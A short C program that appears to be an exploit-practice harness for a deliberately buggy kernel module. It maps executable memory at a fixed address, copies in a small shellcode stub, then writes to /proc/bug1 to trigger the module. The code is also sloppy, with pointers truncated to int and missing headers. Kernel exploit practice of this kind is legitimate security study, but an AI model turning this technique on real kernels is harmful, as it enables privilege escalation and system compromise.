#include <stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include <sys/ioctl.h>
#include<fcntl.h>
#include<linux/mman.h>

char shellcode[] = "\x55\x48\x89\xe5\xe9\x4b\xf9\x3f\x00\x5d\xc3";

void test(void) {
    __asm__
    (" \
        jmp 0x800000; \
    ");
}

int main(int argc, char **argv)
{
    int fd;
    int *ptr;
    printf("--0---0x%x\n", (int)test);
    printf("--1---%p\n", (void*)test);
     
    ptr = (int)test;
    printf("--ptr:%p---0x%x,0x%x,0x%x\n", ptr, *(ptr), *(ptr+1), *(ptr+2));
   
    ptr = mmap(0x4000000, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0);
    if (ptr == (void*)-1)
        printf("mmap can not map ok!\n");
    printf("%p\n", ptr);
    memcpy(ptr, shellcode, sizeof(shellcode));
    printf("--ptr:%p---0x%x,0x%x,0x%x\n", ptr, *(ptr), *(ptr+1), *(ptr+2));


    fd = open("/proc/bug1",O_RDWR);
    if(fd==-1){
        printf("Open error !!!\n");
        return -1;
    }
    write(fd, "foo", 3);

    return 0;
}
